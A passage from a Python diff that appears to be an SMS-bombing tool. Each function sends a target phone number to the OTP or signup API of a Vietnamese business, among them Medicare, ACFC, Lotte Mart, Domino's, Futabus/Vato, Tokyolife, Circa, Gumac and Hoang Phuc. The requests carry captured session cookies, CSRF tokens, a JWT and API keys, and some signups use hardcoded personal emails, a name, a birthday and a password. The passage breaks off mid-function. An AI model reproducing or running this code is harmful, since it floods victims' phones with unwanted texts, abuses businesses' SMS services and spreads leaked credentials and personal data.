+    'medicare_session': 'eyJpdiI6IjBQU2VzVHhNbWVSd0VJcHNMZWxJMHc9PSIsInZhbHVlIjoiUkNEODVKa1c1aHkyeldKMCtkVG5aTVBISVhXdmNYY2tpMktucFBWa2F3Z3UwYkZhMHczRnRSK2c5Ui9PblV4Tzczc1dZQy9GNWJvUktYWTBEd1pWa3dyN3JsRnowQjRRY2hOKzQ4OU1wbDhLOEhHcWcvWDVWeGxTOC9VSkVlZnUiLCJtYWMiOiI0YzFlYWE4NDQ5MGYzZGRmNGVjODQ2ZjBhMDdkZTJjNjFiNGIwMmFhMTYwMTYwOGJjNmUzOTNiMTI5MzUxZjllIiwidGFnIjoiIn0%3D',
+    '_ga': 'GA1.2.510182867.1720297701',
+    '_gid': 'GA1.2.1839608181.1720297709',
+    '_gat_gtag_UA_257373458_1': '1',
+    '_fbp': 'fb.1.1720297708926.352505189707594376',
+    '_ga_CEMYNHNKQ2': 'GS1.1.1720297700.1.1.1720297727.0.0.0',
+    '_ga_8DLTVS911W': 'GS1.1.1720297700.1.1.1720297727.0.0.0',
+    '_ga_R7XKMTVGEW': 'GS1.1.1720297700.1.1.1720297727.33.0.0',
+}
+
+    headers = {
+    'Accept': 'application/json, text/plain, */*',
+    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'Cache-Control': 'no-cache',
+    'Connection': 'keep-alive',
+    'Content-Type': 'application/json',
+    # 'Cookie': 'SERVER=nginx3; _gcl_au=1.1.2035327165.1720297698; XSRF-TOKEN=eyJpdiI6Im15a3BJL0ZqODArK0l1VS9FOTFneFE9PSIsInZhbHVlIjoiNDFUelQ3T0lBQmdqbEpmYmxyU29rSStpQ1ZhdUl6UndMSEpHSkJLclRpWnI0c0ZBNDRYQnpHK0kxdGNXcFpMMHFuM0lVZHpmeWNWamtYS1MwdEVYRHQ1THVhZ3Z6amRtMUVkN1ZWTEozV3B5NXJBWmlrZHduUXZPTUg3aW1uemkiLCJtYWMiOiJlYjMzMmQ4N2YzNTQyODAxMWQ2YTYxYjFiYzhhNGMxMmFiMmE3ZTFiMGNkNTYwNDM2MGM3ZDVhZDcyZGJlYTY4IiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6IjBQU2VzVHhNbWVSd0VJcHNMZWxJMHc9PSIsInZhbHVlIjoiUkNEODVKa1c1aHkyeldKMCtkVG5aTVBISVhXdmNYY2tpMktucFBWa2F3Z3UwYkZhMHczRnRSK2c5Ui9PblV4Tzczc1dZQy9GNWJvUktYWTBEd1pWa3dyN3JsRnowQjRRY2hOKzQ4OU1wbDhLOEhHcWcvWDVWeGxTOC9VSkVlZnUiLCJtYWMiOiI0YzFlYWE4NDQ5MGYzZGRmNGVjODQ2ZjBhMDdkZTJjNjFiNGIwMmFhMTYwMTYwOGJjNmUzOTNiMTI5MzUxZjllIiwidGFnIjoiIn0%3D; _ga=GA1.2.510182867.1720297701; _gid=GA1.2.1839608181.1720297709; _gat_gtag_UA_257373458_1=1; _fbp=fb.1.1720297708926.352505189707594376; _ga_CEMYNHNKQ2=GS1.1.1720297700.1.1.1720297727.0.0.0; _ga_8DLTVS911W=GS1.1.1720297700.1.1.1720297727.0.0.0; _ga_R7XKMTVGEW=GS1.1.1720297700.1.1.1720297727.33.0.0',
+    'Origin': 'https://medicare.vn',
+    'Pragma': 'no-cache',
+    'Referer': 'https://medicare.vn/login',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-origin',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+    'X-XSRF-TOKEN': 'eyJpdiI6Im15a3BJL0ZqODArK0l1VS9FOTFneFE9PSIsInZhbHVlIjoiNDFUelQ3T0lBQmdqbEpmYmxyU29rSStpQ1ZhdUl6UndMSEpHSkJLclRpWnI0c0ZBNDRYQnpHK0kxdGNXcFpMMHFuM0lVZHpmeWNWamtYS1MwdEVYRHQ1THVhZ3Z6amRtMUVkN1ZWTEozV3B5NXJBWmlrZHduUXZPTUg3aW1uemkiLCJtYWMiOiJlYjMzMmQ4N2YzNTQyODAxMWQ2YTYxYjFiYzhhNGMxMmFiMmE3ZTFiMGNkNTYwNDM2MGM3ZDVhZDcyZGJlYTY4IiwidGFnIjoiIn0=',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+}
+
+    json_data = {
+    'mobile': phone,
+    'mobile_country_prefix': '84',
+}
+
+    response = requests.post('https://medicare.vn/api/otp', cookies=cookies, headers=headers, json=json_data);hoanthanh("medicare", phone)
+def acfc(phone):
+    cookies = {
+    '_evga_d955': '{%22uuid%22:%22a93baeb4ee0b4f94%22}',
+    '_gcl_gs': '2.1.k1$i1720297927',
+    '_gcl_au': '1.1.1109989705.1720297932',
+    '_gcl_aw': 'GCL.1720297933.Cj0KCQjw1qO0BhDwARIsANfnkv8mJ0q74DUUs3U7s_VOOT_naF0l0PVGx2vbS_DYa-tHmO_dFuxiIQwaApggEALw_wcB',
+    '_ga': 'GA1.1.669040222.1720297933',
+    '_sfid_599e': '{%22anonymousId%22:%22a93baeb4ee0b4f94%22%2C%22consents%22:[]}',
+    '_tt_enable_cookie': '1',
+    '_ttp': 'XkRw_9JIScHjzJOJvMn0bzslTxh',
+    'PHPSESSID': 'puf048o1vjsq9933top4t6qhv3',
+    'aws-waf-token': '537b5066-8836-44fa-b0bd-72500361bff3:BgoAqZCQRyMOAAAA:y7QyloBvBvA1oTMJqTaA5hHZdTah4qJ7CkCrjDS9+NLmNG1Sfhvhzq1hDBCUfXCfeEZB6FEyWIrMq6s/7Cn79NbkEqfIZtPCpyWr8ImIo70W7O12MJeFN5R1QRXf7BH0oX0cvtwqp/woaxMDXxUajbtxe9ZjVIN1prRIaPCEyeFvKcdw7V9wj4NvwGVyzLwvy4fYpOwWBcZ7ZJQkaRYcK+HUToRSgX/BkOWddqQ5vZYTOvJxohH/Ig==',
+    'form_key': 'z6U4dNbxwcokMy9u',
+    '_fbp': 'fb.2.1720297944244.46181901986930848',
+    'mage-cache-storage': '{}',
+    'mage-cache-storage-section-invalidation': '{}',
+    'mage-cache-sessid': 'true',
+    'recently_viewed_product': '{}',
+    'recently_viewed_product_previous': '{}',
+    'recently_compared_product': '{}',
+    'recently_compared_product_previous': '{}',
+    'product_data_storage': '{}',
+    'mage-messages': '',
+    'optiMonkClientId': 'c6552caa-6bee-d03e-34ca-6d9b47869e59',
+    '_ga_PS7MEHMFY3': 'GS1.1.1720297933.1.1.1720297944.49.0.0',
+    'optiMonkClient': 'N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCYAGcqUqAFgjwBtjEyqa7G8A7AewAObMFixA===',
+    'optiMonkSession': '1720297946',
+    'form_key': 'z6U4dNbxwcokMy9u',
+}
+
+    headers = {
+    'accept': 'application/json, text/javascript, */*; q=0.01',
+    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'cache-control': 'no-cache',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    # 'cookie': '_evga_d955={%22uuid%22:%22a93baeb4ee0b4f94%22}; _gcl_gs=2.1.k1$i1720297927; _gcl_au=1.1.1109989705.1720297932; _gcl_aw=GCL.1720297933.Cj0KCQjw1qO0BhDwARIsANfnkv8mJ0q74DUUs3U7s_VOOT_naF0l0PVGx2vbS_DYa-tHmO_dFuxiIQwaApggEALw_wcB; _ga=GA1.1.669040222.1720297933; _sfid_599e={%22anonymousId%22:%22a93baeb4ee0b4f94%22%2C%22consents%22:[]}; _tt_enable_cookie=1; _ttp=XkRw_9JIScHjzJOJvMn0bzslTxh; PHPSESSID=puf048o1vjsq9933top4t6qhv3; aws-waf-token=537b5066-8836-44fa-b0bd-72500361bff3:BgoAqZCQRyMOAAAA:y7QyloBvBvA1oTMJqTaA5hHZdTah4qJ7CkCrjDS9+NLmNG1Sfhvhzq1hDBCUfXCfeEZB6FEyWIrMq6s/7Cn79NbkEqfIZtPCpyWr8ImIo70W7O12MJeFN5R1QRXf7BH0oX0cvtwqp/woaxMDXxUajbtxe9ZjVIN1prRIaPCEyeFvKcdw7V9wj4NvwGVyzLwvy4fYpOwWBcZ7ZJQkaRYcK+HUToRSgX/BkOWddqQ5vZYTOvJxohH/Ig==; form_key=z6U4dNbxwcokMy9u; _fbp=fb.2.1720297944244.46181901986930848; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; optiMonkClientId=c6552caa-6bee-d03e-34ca-6d9b47869e59; _ga_PS7MEHMFY3=GS1.1.1720297933.1.1.1720297944.49.0.0; optiMonkClient=N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCYAGcqUqAFgjwBtjEyqa7G8A7AewAObMFixA===; optiMonkSession=1720297946; form_key=z6U4dNbxwcokMy9u',
+    'origin': 'https://www.acfc.com.vn',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://www.acfc.com.vn/customer/account/create/',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+    'x-requested-with': 'XMLHttpRequest',
+}
+
+    data = {
+    'number_phone': phone,
+    'form_key': 'z6U4dNbxwcokMy9u',
+    'currentUrl': 'https://www.acfc.com.vn/customer/account/create/',
+}
+
+    response = requests.post('https://www.acfc.com.vn/mgn_customer/customer/sendOTP', cookies=cookies, headers=headers, data=data);hoanthanh("acfc", phone)
+def lote(phone):
+    cookies = {
+    '__Host-next-auth.csrf-token': '2c95aedbe3b2a7070c6b91899b2ae8c85931edffbc5f53bf3ceaa177f1a204be%7C5b2082aa598f7c2d9802014b5fabfcd523af03e4738af10baf6ca96063c440b6',
+    '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
+    '_gcl_au': '1.1.2136712951.1720299022',
+    '_ga': 'GA1.1.164372556.1720299023',
+    '_fbp': 'fb.1.1720299024438.549668172235070425',
+    '_ga_6QLJ7DM4XW': 'GS1.1.1720299022.1.1.1720299051.31.0.0',
+}
+
+    headers = {
+    'accept': 'application/json',
+    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json',
+    # 'cookie': '__Host-next-auth.csrf-token=2c95aedbe3b2a7070c6b91899b2ae8c85931edffbc5f53bf3ceaa177f1a204be%7C5b2082aa598f7c2d9802014b5fabfcd523af03e4738af10baf6ca96063c440b6; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn; _gcl_au=1.1.2136712951.1720299022; _ga=GA1.1.164372556.1720299023; _fbp=fb.1.1720299024438.549668172235070425; _ga_6QLJ7DM4XW=GS1.1.1720299022.1.1.1720299051.31.0.0',
+    'origin': 'https://www.lottemart.vn',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+}
+
+    json_data = {
+    'username': phone,
+    'case': 'register',
+}
+
+    response = requests.post(
+    'https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp',
+    cookies=cookies,
+    headers=headers,
+    json=json_data,
+);hoanthanh("lottemart", phone)
+def domi(phone):
+    cookies = {
+    '_gid': 'GA1.2.1143586587.1720312773',
+    '_fbp': 'fb.1.1720312773608.72318382363231927',
+    '_gcl_gs': '2.1.k1$i1720312921',
+    '_gat_UA-41910789-1': '1',
+    '_ga': 'GA1.1.2103093724.1720312773',
+    '_ga_12HB7KTL5M': 'GS1.1.1720312772.1.1.1720312932.49.0.0',
+    '_ga_8GXKYDTW3R': 'GS1.1.1720312772.1.1.1720312933.0.0.0',
+}
+
+    headers = {
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'vi',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json',
+    # 'cookie': '_gid=GA1.2.1143586587.1720312773; _fbp=fb.1.1720312773608.72318382363231927; _gcl_gs=2.1.k1$i1720312921; _gat_UA-41910789-1=1; _ga=GA1.1.2103093724.1720312773; _ga_12HB7KTL5M=GS1.1.1720312772.1.1.1720312932.49.0.0; _ga_8GXKYDTW3R=GS1.1.1720312772.1.1.1720312933.0.0.0',
+    'dmn': 'doqkqr',
+    'origin': 'https://dominos.vn',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://dominos.vn/promotion-listing/bogo-week-digital-t7',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'secret': 'bPG0upAJLk0gz/2W1baS2Q==',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+}
+
+    json_data = {
+    'phone_number': phone,
+    'email': 'nguyentrongkhai130@gmail.com',
+    'type': 0,
+    'is_register': True,
+}
+
+    response = requests.post('https://dominos.vn/api/v1/users/send-otp', cookies=cookies, headers=headers, json=json_data);hoanthanh("dominos", phone)
+def shop(phone):
+    headers = {
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'vi',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json',
+    'key': '441e8136801b70ac87887bca16dd298f',
+    'origin': 'https://thefaceshop.com.vn',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://thefaceshop.com.vn/',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'timestamp': '1720623654086',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+}
+
+    json_data = {
+    'phoneNumber': phone,
+}
+
+    response = requests.post(
+    'https://tfs-api.hsv-tech.io/client/phone-verification/request-verification',
+    headers=headers,
+    json=json_data,
+);hoanthanh("hsv-tech", phone)
+def fu(phone):
+    headers = {
+    'accept': 'application/json',
+    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json',
+    'origin': 'https://futabus.vn',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://futabus.vn/',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+    'x-access-token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjU2OTFhMTk1YjI0MjVlMmFlZDYwNjMzZDdjYjE5MDU0MTU2Yjk3N2QiLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImlwIjoiOjoxIiwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYWNlY2FyLTI5YWU3IiwiYXVkIjoiZmFjZWNhci0yOWFlNyIsImF1dGhfdGltZSI6MTcyMDYyMDYyMywidXNlcl9pZCI6InNFMkk1dkg3TTBhUkhWdVl1QW9QaXByczZKZTIiLCJzdWIiOiJzRTJJNXZIN00wYVJIVnVZdUFvUGlwcnM2SmUyIiwiaWF0IjoxNzIwNjIwNjIzLCJleHAiOjE3MjA2MjQyMjMsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiY3VzdG9tIn19.YR8S04KR7mVRqL68o-a-6svQibV5Gpx8ciD-oxmm3zYMYN55FIAzZPkaZ2rlFaNpGwGl5AkuTWgoVVTU5uTttWOADhoWhOMdICkz811oPzQcjVA0VVG2r7Vg6vVOuKdg3jbD6SJ0ySj6Ln96nI-kcy6Q_169sGYxKIGwknsfM91-NnFRi_D_xNulys0i4OxqRdHxpK42VRkzyl0hwj0sS-cd5i84MT8MtiyOZRhn9J89tMLkHVP5NAyDfHtjm3UYmJYbBRQQf-iaT2nu36AZ_dNRT6rtQuqNpk0vyCIEdPo-9t6cKhaW-I69DBcz5d73fleRTM3zHD-5DlJkpkcWKA',
+    'x-app-id': 'client',
+}
+
+    json_data = {
+    'phoneNumber': phone,
+    'deviceId': 'e3025fb7-5436-4002-9950-e6564b3656a6',
+    'use_for': 'LOGIN',
+}
+
+    response = requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data);hoanthanh("vato", phone)
+def beau(phone):
+    headers = {
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'vi',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json',
+    'key': '584294d68530c7b753d7f5a77c1ddbc2',
+    'origin': 'https://beautybox.com.vn',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://beautybox.com.vn/',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'timestamp': '1720624059192',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+}
+
+    json_data = {
+    'phoneNumber': phone,
+}
+
+    response = requests.post(
+    'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification',
+    headers=headers,
+    json=json_data,
+);hoanthanh("hsv-tech", phone)
+def hoanvu(phone):
+    headers = {
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'vi',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json',
+    'key': '028601f79dcc724ef8b8e7c989c5f649',
+    'origin': 'https://reebok.com.vn',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://reebok.com.vn/',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'timestamp': '1720624197351',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+}
+
+    json_data = {
+    'phoneNumber': phone,
+}
+
+    response = requests.post(
+    'https://reebok-api.hsv-tech.io/client/phone-verification/request-verification',
+    headers=headers,
+    json=json_data,
+);hoanthanh("hsv-tech", phone)
+def tokyo(phone):
+    headers = {
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json',
+    'origin': 'https://tokyolife.vn',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://tokyolife.vn/',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'signature': 'c1336d4c72c0b857cdd6aab4de261aa3',
+    'timestamp': '1720624468348',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+}
+
+    json_data = {
+    'phone_number': phone,
+    'name': 'khải nguyễn',
+    'password': 'vjyy1234',
+    'email': 'trongkhai1118@gmail.com',
+    'birthday': '2002-07-10',
+    'gender': 'female',
+}
+
+    response = requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', headers=headers, json=json_data);hoanthanh("tokyolife", phone)
+def cir(phone):
+    headers = {
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'vi-VN',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json',
+    'origin': 'https://circa.vn',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://circa.vn/',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+}
+
+    json_data = {
+    'phone': {
+        'country_code': '84',
+        'phone_number': phone,
+    },
+}
+
+    response = requests.post('https://api.circa.vn/v1/entity/validation-phone', headers=headers, json=json_data);hoanthanh("circa", phone)
+def guma(phone):
+    headers = {
+    'Accept': 'application/json',
+    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'Cache-Control': 'no-cache',
+    'Connection': 'keep-alive',
+    'Content-Type': 'application/json',
+    'Origin': 'https://gumac.vn',
+    'Pragma': 'no-cache',
+    'Referer': 'https://gumac.vn/',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-site',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+}
+
+    json_data = {
+    'phone': phone,
+}
+
+    response = requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', headers=headers, json=json_data);hoanthanh("gumac", phone)
+def hoang(phone):
+    cookies = {
+    'PHPSESSID': '023c4d0e7b15edc71f14f346ff4ef829',
+    'form_key': 'KELcFD4RySb6WQsc',
+    'mage-cache-storage': '{}',
+    'mage-cache-storage-section-invalidation': '{}',
+    'mage-cache-sessid': 'true',
+    'mage-messages': '',
+    'recently_viewed_product': '{}',
+    'recently_viewed_product_previous': '{}',
+    'recently_compared_product': '{}',
+    'recently_compared_product_previous': '{}',
+    'product_data_storage': '{}',
+    'form_key': 'KELcFD4RySb6WQsc',
+    '_fbp': 'fb.1.1720626061882.764993913589523922',
+    '_pk_ses.564990520.6493': '*',
+    '_gcl_gs': '2.1.k1$i1720626054',
+    '_gcl_au': '1.1.676093199.1720626062',
+    'au_id': '1550063352',
+    '_ac_au_gt': '1720626058223',
+    '_ga': 'GA1.1.42709150.1720626062',
+    '_gcl_aw': 'GCL.1720626063.CjwKCAjw4ri0BhAvEiwA8oo6F2MiLFPQwoa8aYSViFa1OyQnHiLIFOvjgAyZ70q6t5zp2PnA6GbquhoCVgMQAvD_BwE',
+    'cdp_session': '1',
+    '_asm_visitor_type': 'r',
+    'mst-cache-warmer-track': '1720626075588',
+    '_asm_ss_view': '%7B%22time%22%3A1720626062220%2C%22sid%22%3A%225182297358166228%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222024-07-10T15%3A41%3A25%22%2C%22duration%22%3A23213%7D',
+    '_ga_48P0WR3P2C': 'GS1.1.1720626062.1.1.1720626086.36.0.0',
+    'private_content_version': '5e3e65678616f3e49864dce16d1f43de',
+    'section_data_ids': '{}',
+    '_pk_id.564990520.6493': '1550063352.1720626062.1.1720626136.1720626062.',
+    '_ac_client_id': '1550063352.1720626132',
+    '_ac_an_session': 'zmzizrzhzhzqzkzgzmzrzizlzlzhzhzrzdzizmzmzjzjzlzgzgzmzhzdzizkzhzjzlzhzlzizgzhzdzizdzizkzhzjzlzhzlzizgzhzdzizkzhzjzlzhzlzizgzhzdzizdzhznzdzhzd2f27zdzgzdzlzmzmznzqzdzd321v272624',
+    'cdp_blocked_sid_17509314': 'true',
+}
+
+    headers = {
+    'accept': 'application/json, text/javascript, */*; q=0.01',
+    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'cache-control': 'no-cache',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    # 'cookie': 'PHPSESSID=023c4d0e7b15edc71f14f346ff4ef829; form_key=KELcFD4RySb6WQsc; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; form_key=KELcFD4RySb6WQsc; _fbp=fb.1.1720626061882.764993913589523922; _pk_ses.564990520.6493=*; _gcl_gs=2.1.k1$i1720626054; _gcl_au=1.1.676093199.1720626062; au_id=1550063352; _ac_au_gt=1720626058223; _ga=GA1.1.42709150.1720626062; _gcl_aw=GCL.1720626063.CjwKCAjw4ri0BhAvEiwA8oo6F2MiLFPQwoa8aYSViFa1OyQnHiLIFOvjgAyZ70q6t5zp2PnA6GbquhoCVgMQAvD_BwE; cdp_session=1; _asm_visitor_type=r; mst-cache-warmer-track=1720626075588; _asm_ss_view=%7B%22time%22%3A1720626062220%2C%22sid%22%3A%225182297358166228%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222024-07-10T15%3A41%3A25%22%2C%22duration%22%3A23213%7D; _ga_48P0WR3P2C=GS1.1.1720626062.1.1.1720626086.36.0.0; private_content_version=5e3e65678616f3e49864dce16d1f43de; section_data_ids={}; _pk_id.564990520.6493=1550063352.1720626062.1.1720626136.1720626062.; _ac_client_id=1550063352.1720626132; _ac_an_session=zmzizrzhzhzqzkzgzmzrzizlzlzhzhzrzdzizmzmzjzjzlzgzgzmzhzdzizkzhzjzlzhzlzizgzhzdzizdzizkzhzjzlzhzlzizgzhzdzizkzhzjzlzhzlzizgzhzdzizdzhznzdzhzd2f27zdzgzdzlzmzmznzqzdzd321v272624; cdp_blocked_sid_17509314=true',
+    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQxNzMwMTkiLCJhcCI6IjExMjAyMzc5NzIiLCJpZCI6ImQ0YmU4OTUwMTY5YzFjM2IiLCJ0ciI6ImMzNzBjYzJiZTc1ZmQ0OGJmZTJjNDQ4YmM1MWIwMzI2IiwidGkiOjE3MjA2MjYyNzE1NTIsInRrIjoiMTMyMjg0MCJ9fQ==',
+    'origin': 'https://hoang-phuc.com',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://hoang-phuc.com/customer/account/create/',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'traceparent': '00-c370cc2be75fd48bfe2c448bc51b0326-d4be8950169c1c3b-01',
+    'tracestate': '1322840@nr=0-1-4173019-1120237972-d4be8950169c1c3b----1720626271552',
